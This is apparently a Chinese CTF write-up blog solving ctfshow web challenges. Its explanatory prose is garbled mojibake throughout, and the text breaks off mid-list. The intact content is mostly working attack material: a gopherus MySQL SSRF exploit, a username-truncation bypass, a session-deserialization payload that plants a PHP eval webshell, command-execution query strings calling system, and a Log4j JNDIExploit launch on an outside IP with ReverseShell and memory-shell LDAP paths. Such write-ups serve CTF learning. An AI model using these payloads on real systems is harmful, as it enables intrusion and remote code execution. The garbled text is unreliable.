<p>curlä¹Ÿæ²¡æ³•ç”¨fileå‡½æ•°ï¼Œæ¢ç”¨gopherï¼Œhintç»™å‡ºmysqlæ— å¯†ç ï¼Œç«¯å£3306</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>

<p>å¾€æœ¬åœ°å†™æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311252255078.png" alt="image-20231125225547960"></p>
<p>æŠŠpayload urlencodeä¸€ä¸‹ä¼ è¿›å»æˆåŠŸå†™å…¥tt.phpæ–‡ä»¶ä¸­äº†ï¼Œèšå‰‘ç›´æ¥æ‰“å°±è¡Œ</p>
<h2 id="çº¢åŒ…é¢˜-è‘µèŠ±å®å…¸"><a href="#çº¢åŒ…é¢˜-è‘µèŠ±å®å…¸" class="headerlink" title="çº¢åŒ…é¢˜ è‘µèŠ±å®å…¸"></a>çº¢åŒ…é¢˜ è‘µèŠ±å®å…¸</h2><p>æœ¬æ¥ä»¥ä¸ºè€ƒçš„æ˜¯PDOçš„sqlæ³¨å…¥ï¼Œä½†æ˜¯ç”¨çš„ä¸æ˜¯gbkï¼Œæ²¡æ³•å®½å­—èŠ‚</p>
<p>æ³¨å†Œ+ç™»é™†å°±å‡ºflag</p>
<h2 id="çº¢åŒ…é¢˜-è¾Ÿé‚ªå‰‘è°±"><a href="#çº¢åŒ…é¢˜-è¾Ÿé‚ªå‰‘è°±" class="headerlink" title="çº¢åŒ…é¢˜ è¾Ÿé‚ªå‰‘è°±"></a>çº¢åŒ…é¢˜ è¾Ÿé‚ªå‰‘è°±</h2><p>mysqlæœ‰ä¸ªç‰¹æ€§ï¼Œå½“æ¨¡å¼è®¾ç½®ä¸º<strong>éä¸¥æ ¼</strong>çš„æ—¶å€™ï¼Œå¦‚æœæ’å…¥çš„å€¼æ¯”åˆ—è®¾ç½®çš„å€¼é•¿ï¼Œä¼šè‡ªåŠ¨æˆªå–ä¸€éƒ¨åˆ†</p>
<p>æ¯”å¦‚æ’å…¥admin+ç©ºæ ¼x300ï¼Œå¦‚æœåˆ—è®¾ç½®çš„æ˜¯VARCHAR(255)ï¼Œmysqlä¼šè‡ªåŠ¨æˆªå–åˆ°åˆé€‚çš„ä½ç½®&#x3D;&gt;admin</p>
<p>login.phpå†™æ­»äº†æŸ¥è¯¢çš„ç”¨æˆ·ä¸ºadmin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$data=$db-&gt;select(&quot;admin&quot;,[&quot;username&quot;,&quot;password&quot;],[&quot;username[=]&quot;=&gt;&quot;admin&quot;]);</span><br><span class="line">foreach($data as $d)&#123;</span><br><span class="line">	</span><br><span class="line">	if ($d[&#x27;password&#x27;]===$user_password)&#123;</span><br><span class="line">		$_SESSION[&#x27;user&#x27;]=$user_name;</span><br><span class="line">		die(&quot;login success!&lt;br&gt;&lt;hr&gt;flag is $flag&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªèƒ½é€šè¿‡æ³¨å†Œæ¥è¦†ç›–è¿™ä¸ªåŸæ¥çš„admin</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user_name=trim($_POST[&#x27;user_name&#x27;]);</span><br><span class="line">$user_password=trim($_POST[&#x27;user_password&#x27;]);</span><br><span class="line">$data=$db-&gt;select(&quot;admin&quot;,[&quot;username&quot;,&quot;password&quot;],[&quot;username[=]&quot;=&gt;$user_name]);</span><br><span class="line">if(count($data)&gt;0)&#123;</span><br><span class="line">	die(&quot;username in use!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($user_name===&quot;admin&quot;)&#123;</span><br><span class="line">	die(&quot;you are not admin!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\ï¼ˆ|\ï¼‰|\-|\_|\+|\=|\&#123;|\[|\&#125;|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\?/i&quot;,$user_name))&#123;</span><br><span class="line">	die(&quot;stop hack!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$data = $db-&gt;insert(&#x27;admin&#x27;,[&quot;username&quot;=&gt;&quot;$user_name&quot;,&quot;password&quot;=&gt;&quot;$user_password&quot;]);</span><br></pre></td></tr></table></figure>

<p>ç”±äºtrimå‡½æ•°çš„å¤„ç†ï¼Œæ‰€æœ‰å¼€å¤´&#x2F;ç»“å°¾çš„ç‰¹æ®Šç¬¦å·éƒ½ä¼šè¢«åˆ å»ï¼Œæ‰€ä»¥åªèƒ½æ„é€ admin+ç©ºæ ¼x300+1æ¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_name=admin                                                                                                                                                                                                                                                                         1&amp;user_password=1</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ³¨å†Œç„¶åç™»é™†</p>
<h2 id="ã€nlã€‘éš¾äº†"><a href="#ã€nlã€‘éš¾äº†" class="headerlink" title="ã€nlã€‘éš¾äº†"></a>ã€nlã€‘éš¾äº†</h2><p>&gt;nl</p>
<h2 id="ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†"><a href="#ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†" class="headerlink" title="ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†"></a>ä¸€åˆ‡çœ‹èµ·æ¥éƒ½é‚£ä¹ˆåˆæƒ…åˆç†</h2><p>sessionçš„ååºåˆ—åŒ–æ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œçš„æ—¶å€™ä¼šè¿›è¡Œä¸€æ¬¡ååºåˆ—åŒ–</p>
<p>ç„¶åå†äº†è§£ä¸€ä¸‹åºåˆ—åŒ–å¤„ç†å™¨</p>
<blockquote>
<table>
<thead>
<tr>
<th>å¤„ç†å™¨åç§°</th>
<th>å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„<strong>æ•°ç»„</strong></td>
</tr>
</tbody></table>
<p>ä¸Šè¿°ä¸‰ç§å¤„ç†å™¨ä¸­ï¼Œ<code>php_serialize</code>åœ¨å†…éƒ¨ç®€å•åœ°ç›´æ¥ä½¿ç”¨ <code>serialize/unserialize</code>å‡½æ•°ï¼Œå¹¶ä¸”ä¸ä¼šæœ‰<code>php</code>å’Œ <code>php_binary</code>æ‰€å…·æœ‰çš„é™åˆ¶ã€‚ ä½¿ç”¨è¾ƒæ—§çš„åºåˆ—åŒ–å¤„ç†å™¨å¯¼è‡´<code>$_SESSION</code> çš„ç´¢å¼•æ—¢ä¸èƒ½æ˜¯æ•°å­—ä¹Ÿä¸èƒ½åŒ…å«ç‰¹æ®Šå­—ç¬¦(<code>|</code> å’Œ <code>!</code>) ã€‚</p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271344073.png" alt="image-20231127134447028"></p>
<p>ç»“æœä¸º<code>session|s:4:&quot;test&quot;;</code></p>
<p><code>session</code> ä¸º<code>$_SESSION[&#39;session&#39;]</code>çš„é”®åï¼Œ<code>|</code>åä¸ºä¼ å…¥ GET å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</p>
<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;sessionsessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;sessionsessionsessionsessionsessionsession&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271347803.png" alt="image-20231127134749768"></p>
<p>ç»“æœä¸º<code>*sessionsessionsessionsessionsessionsessions:4:&quot;test&quot;;</code></p>
<p><code>*</code>ä¸ºé”®åé•¿åº¦å¯¹åº”çš„ ASCII çš„å€¼ï¼Œ<code>sessionsessionsessionsessionsessionsession</code>ä¸ºé”®åï¼Œ<code>s:4:&quot;test&quot;;</code>ä¸ºä¼ å…¥ GET å‚æ•°ç»è¿‡åºåˆ—åŒ–åçš„å€¼</p>
<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;var_dump(sys_get_temp_dir());</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">&gt;session_save_path(&quot;D:\\server\\tmp&quot;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271350286.png" alt="image-20231127135048253"></p>
<p>ç»“æœä¸º<code>a:1:&#123;s:7:&quot;session&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>å•çº¯çš„ååºåˆ—åŒ–</p>
<p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p>
</blockquote>
<p>ä½†æŒ‡å®šè§£æå™¨ä¸ºphpæ—¶ï¼Œå¯ä»¥äººä¸ºæ·»åŠ ä¸€ä¸ª<code>|</code>ï¼Œç„¶åè·Ÿéœ€è¦ååºåˆ—åŒ–çš„å†…å®¹ã€‚ä»è€ŒæŒ‡å®šåºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;ä½¿ç”¨&quot;.$this-&gt;password.&quot;ç™»é™†&quot;.($this-&gt;status?&quot;æˆåŠŸ&quot;:&quot;å¤±è´¥&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€çœ¼å†™æ–‡ä»¶ï¼ŒæŒ‡å®š<code>username=test.php</code>å’Œ<code>password=&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code>ï¼Œç„¶åæŠŠåºåˆ—åŒ–å‡ºæ¥çš„å†…å®¹åŠ ä¸ª<code>|</code>ç„¶åbase64ä¼ å…¥å°±è¡Œ</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:8:&quot;test.php&quot;;s:8:&quot;password&quot;;s:30:&quot;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br><span class="line">base64:</span><br><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo4OiJ0ZXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMDoiPD9waHAgZXZhbCgkX1BPU1RbInNoZWxsIl0pOz8+IjtzOjY6InN0YXR1cyI7Tjt9</span><br><span class="line">urlencode:</span><br><span class="line">%66%45%38%36%4e%44%6f%69%56%58%4e%6c%63%69%49%36%4d%7a%70%37%63%7a%6f%34%4f%69%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%37%63%7a%6f%34%4f%69%4a%30%5a%58%4e%30%4c%6e%42%6f%63%43%49%37%63%7a%6f%34%4f%69%4a%77%59%58%4e%7a%64%32%39%79%5a%43%49%37%63%7a%6f%7a%4d%44%6f%69%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%49%6e%4e%6f%5a%57%78%73%49%6c%30%70%4f%7a%38%2b%49%6a%74%7a%4f%6a%59%36%49%6e%4e%30%59%58%52%31%63%79%49%37%54%6a%74%39</span><br></pre></td></tr></table></figure>

<p>å…ˆè®¿é—®index.phpï¼Œåœ¨æœåŠ¡å™¨ä¸Šå­˜ä¸ªsessionï¼Œç„¶åå¸¦ç€ä¿®æ”¹åçš„payloadå†è®¿é—®index.php</p>
<p>æ­¤æ—¶ä¼šè¿›å…¥è¿™å±‚åˆ¤æ–­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä»è€ŒæŠŠå¯æ§çš„$_cookie[â€˜limitâ€™]å†™å…¥sessionæ–‡ä»¶ä¸­ï¼Œå†è®¿é—®&#x2F;inc&#x2F;inc.phpè¿›è¡Œååºåˆ—åŒ–ï¼ŒæˆåŠŸå†™å…¥æ–‡ä»¶log-test.php</p>
<p>èšå‰‘ç›´æ¥è¿å°±è¡Œ</p>
<h2 id="çº¢åŒ…é¢˜-è€—å­å°¾æ±"><a href="#çº¢åŒ…é¢˜-è€—å­å°¾æ±" class="headerlink" title="çº¢åŒ…é¢˜ è€—å­å°¾æ±"></a>çº¢åŒ…é¢˜ è€—å­å°¾æ±</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">function CTFSHOW_36_D($a,$b)&#123;</span><br><span class="line">    $dis = array(&quot;var_dump&quot;,&quot;exec&quot;,&quot;readfile&quot;,&quot;highlight_file&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;,&quot;&quot;);</span><br><span class="line">    $a = strtolower($a);</span><br><span class="line">    if (!in_array($a,$dis,true)) &#123;</span><br><span class="line">        forward_static_call_array($a,$b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">CTFSHOW_36_D($a,$b);</span><br><span class="line">echo &quot;rlezphp!!!&quot;;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çš„é‡ç‚¹å°±æ˜¯é€šè¿‡forward_static_call_arrayçš„å›è°ƒå‡½æ•°æ¥è°ƒç”¨å‡½æ•°ï¼Œä½†æ˜¯forward_static_call_arrayä»…èƒ½ä½¿ç”¨é™æ€çš„å‡½æ•°ï¼Œæ‰€ä»¥evalï¼Œincludeè¿™ç±»å‡½æ•°å°±æ²¡æ³•ç”¨</p>
<p>ä¸¤ç§è§£æ³•</p>
<h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p>å¯»æ‰¾ä¸€ä¸ªæ²¡åœ¨é»‘åå•å†…çš„å›è°ƒå‡½æ•°ï¼Œé€šè¿‡forward_static_call_arrayè°ƒç”¨è¿™ä¸ªå›è°ƒå‡½æ•°ï¼Œå†è°ƒç”¨çœŸæ­£çš„æ¶æ„å‡½æ•°</p>
<p>å‚è€ƒ-&gt;<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<p>å¥‡ç‰¹çš„æ˜¯ï¼Œé»‘åå•å†…æ²¡æœ‰æœ¬èº«è¿™ä¸ªforward_static_call_arrayï¼Œè€Œä¸”register_shutdown_functionä¹Ÿæ‰“æˆäº†registregister_shutdown_functionï¼Œæ‰€ä»¥å¯ä»¥ä»»é€‰ä¸€ä¸ªå‡½æ•°æ¥æ‰“</p>
<p>è¦æ±‚å›è°ƒçš„ç¬¬äºŒä¸ªå‚æ•°æ—¶arrayï¼Œæ‰€ä»¥å¯ä»¥æ„é€ è¿™æ ·ä¸€ä¸ªé“¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">forward_static_call_array-&gt;forward_static_call_array-&gt;system-&gt;&#x27;ls&#x27;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­forward_static_call_arrayä¸º$aï¼Œsystem-&gt;â€™lsâ€™ä¸º$bï¼Œä¸”$bä¸ºarray</p>
<blockquote>
<h3 id="è¯´æ˜-Â¶"><a href="#è¯´æ˜-Â¶" class="headerlink" title="è¯´æ˜ Â¶"></a>è¯´æ˜<a href="https://www.php.net/manual/zh/function.forward-static-call-array.php#refsect1-function.forward-static-call-array-description"> Â¶</a></h3><p>forward_static_call_array(<a href="https://www.php.net/manual/zh/language.types.callable.php">callable</a> $callback, array $args): <a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a></p>
<p>é€šè¿‡ <code>callback</code> å‚æ•°æŒ‡å®šè°ƒç”¨ç”¨æˆ·å®šä¹‰çš„å‡½æ•°æˆ–è€…æ–¹æ³•ã€‚æ­¤å‡½æ•°å¿…é¡»åœ¨æ–¹æ³•ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ï¼Œä¸èƒ½åœ¨ç±»å¤–ä½¿ç”¨ã€‚å®ƒä½¿ç”¨<a href="https://www.php.net/manual/zh/language.oop5.late-static-bindings.php">åæœŸé™æ€ç»‘å®š</a>ã€‚è½¬å‘æ–¹æ³•çš„æ‰€æœ‰å‚æ•°éƒ½ä½œä¸ºå€¼å’Œæ•°ç»„ä¼ é€’ï¼Œç±»ä¼¼äº <a href="https://www.php.net/manual/zh/function.call-user-func-array.php">call_user_func_array()</a>ã€‚</p>
<table>
<thead>
<tr>
<th>æ³¨æ„ forward_static_call_array() çš„å‚æ•°ä¸æ˜¯é€šè¿‡å¼•ç”¨ä¼ é€’çš„ã€‚</th>
</tr>
</thead>
</table>
</blockquote>
<p>æœ‰ä¸ªå‘ç‚¹å°±æ˜¯è¿™ä¸ª$bä¸ºäºŒç»´æ•°ç»„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ar = array(</span><br><span class="line">        &quot;system&quot;,</span><br><span class="line">        array(&quot;ls&quot;)</span><br><span class="line">);</span><br><span class="line">=&gt;array(2) &#123; [0]=&gt; string(6) &quot;system&quot; [1]=&gt; array(1) &#123; [0]=&gt; string(2) &quot;ls&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­array[0]ä½œä¸ºå¥—å¨ƒä¸­forward_static_call_arrayçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡å®šäº†ä½¿ç”¨çš„é™æ€å‡½æ•°åã€‚array[1]ä½œä¸ºforward_static_call_arrayçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œä¸ºarrayä¼ å…¥é™æ€å‡½æ•°ä¸­</p>
<p>æ‰€ä»¥payloadå°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=forward_static_call_array&amp;b[]=system&amp;b[][]=ls</span><br></pre></td></tr></table></figure>

<h2 id="å‘½åç©ºé—´"><a href="#å‘½åç©ºé—´" class="headerlink" title="å‘½åç©ºé—´"></a>å‘½åç©ºé—´</h2><blockquote>
<p>åœ¨phpå½“ä¸­é»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p>
<p>æ³¨æ„è®¿é—®ä»»æ„å…¨å±€ç±»ã€å‡½æ•°æˆ–å¸¸é‡ï¼Œéƒ½å¯ä»¥ä½¿ç”¨å®Œå…¨é™å®šåç§°ï¼Œä¾‹å¦‚ \strlen() æˆ– \Exception æˆ– \INI_ALLã€‚</p>
<p>åœ¨å‘½åç©ºé—´å†…éƒ¨è®¿é—®å…¨å±€ç±»ã€å‡½æ•°å’Œå¸¸é‡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;namespace Foo;</span><br><span class="line"></span><br><span class="line">&gt;function strlen() &#123;&#125;</span><br><span class="line">&gt;const INI_ALL = 3;</span><br><span class="line">&gt;class Exception &#123;&#125;</span><br><span class="line"></span><br><span class="line">&gt;$a = \strlen(&#x27;hi&#x27;); // è°ƒç”¨å…¨å±€å‡½æ•°strlen</span><br><span class="line">&gt;$b = \INI_ALL; // è®¿é—®å…¨å±€å¸¸é‡ INI_ALL</span><br><span class="line">&gt;$c = new \Exception(&#x27;error&#x27;); // å®ä¾‹åŒ–å…¨å±€ç±» Exception</span><br><span class="line">&gt;?&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>å…ˆè¦å¼•å…¥ä¸€ä¸ªå‘½åç©ºé—´çš„äº†è§£ï¼Œåœ¨phpä¸­é»˜è®¤çš„å‘½åç©ºé—´æ˜¯\ï¼Œå¦‚æœä¸äº‹å…ˆå†™ï¼Œæ‰€æœ‰å‡½æ•°éƒ½åœ¨å…¨å±€ç©ºé—´ä¸­ä½¿ç”¨ï¼Œè¿™å°±æœ‰å¯èƒ½é€ æˆå‡½æ•°åå†²çª</p>
<p>æ‰€ä»¥ä¸éš¾æƒ³åˆ°ç›´æ¥ä½¿ç”¨ç»å¯¹è·¯å¾„è°ƒç”¨systemå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=\system&amp;b[]=cat flag.php</span><br></pre></td></tr></table></figure>

<h2 id="æ–°å¹´å¥½"><a href="#æ–°å¹´å¥½" class="headerlink" title="æ–°å¹´å¥½?"></a>æ–°å¹´å¥½?</h2><p>jsé¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/flag&#x27;, function (req, res) &#123;</span><br><span class="line">    function getflag(flag) &#123;</span><br><span class="line">      res.send(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    let delay = 10 * 1000;</span><br><span class="line">    if (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(getflag, delay,flag);</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      try &#123;</span><br><span class="line">        res.send(&#x27;Timeout!&#x27;);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å…ˆå®šä¹‰äº†ä¸€ä¸ªdelayå˜é‡ä¸º10sï¼Œç„¶åå†å’Œreq.query.delayï¼Œä¼ å…¥çš„å‚æ•°delayå–æ›´å¤§çš„æ•°</p>
<p>ç„¶åç”¨delayä½œä¸ºè®¾ç½®è¶…æ—¶çš„å‡½æ•°ï¼Œè¿™ä¸€çœ¼å°±æ˜¯æº¢å‡ºï¼Œç›´æ¥æŠŠdelayå¾€å¤§äº†å¡«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?delay=99999999999999999999</span><br></pre></td></tr></table></figure>



<h2 id="çº¢åŒ…ä¸€"><a href="#çº¢åŒ…ä¸€" class="headerlink" title="çº¢åŒ…ä¸€"></a>çº¢åŒ…ä¸€</h2><p>F12</p>
<h2 id="Log4jå¤ç°"><a href="#Log4jå¤ç°" class="headerlink" title="Log4jå¤ç°"></a>Log4jå¤ç°</h2><p>æœ€éš¾å¤ç°çš„ä¸€é›†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 89.117.226.223 -p 8888 -l 1234</span><br></pre></td></tr></table></figure>

<p>èµ·ä¸€ä¸ªlog4j expæœåŠ¡ï¼Œç„¶åç”¨è¿™ä¸ªæœåŠ¡é‡Œçš„Basic&#x2F;TomcatEchoï¼Œåœ¨è®¿é—®å¤´é‡ŒåŠ ä¸ªcmd:lsèƒ½ç›´æ¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Supported LADP Queries</span><br><span class="line">* all words are case INSENSITIVE when send to ldap server</span><br><span class="line"></span><br><span class="line">[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Command/[cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/SpringEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicEcho</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/JettyMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/JBossMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/WebsphereMemshell</span><br><span class="line">    ldap://127.0.0.1:1389/Basic/SpringMemshell</span><br><span class="line"></span><br><span class="line">[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]</span><br><span class="line">    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]</span><br><span class="line">    